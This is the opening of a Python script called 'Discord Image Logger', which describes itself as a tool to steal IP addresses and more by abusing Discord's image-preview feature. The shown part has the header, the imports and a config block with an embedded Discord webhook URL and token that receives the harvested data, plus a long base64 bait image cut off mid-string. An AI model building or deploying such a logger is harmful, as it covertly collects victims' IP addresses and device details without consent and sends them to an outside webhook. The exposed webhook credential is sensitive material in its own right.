# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1354451319628238979/eH_yH0qisFfhz6p2pO4n_SMvQx2NcAl7E2fR4hpjEV0ItjYJrQ1COWBJta9-fVFon8v9",
    "image": "data:image/jpeg;base64,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